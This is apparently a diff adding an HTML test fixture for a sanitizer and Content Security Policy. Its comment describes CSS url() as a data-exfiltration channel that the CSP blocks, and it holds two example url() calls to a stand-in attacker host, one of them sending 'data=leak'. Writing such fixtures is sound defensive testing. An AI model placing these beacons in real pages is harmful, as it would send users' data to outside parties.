@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+  <head>
+    <style>
+      /* CSS url() is an exfiltration channel that the sanitizer intentionally
+         preserves (it is legitimate styling). The strict CSP img-src blocks the
+         request because it has no wildcard host. */
+      body { background-image: url("https://attacker.example/collect?data=leak"); }
+    </style>
+  </head>
+  <body>
+    <div style="background: url('https://attacker.example/pixel?x=1')">styled</div>
+  </body>
+</html>
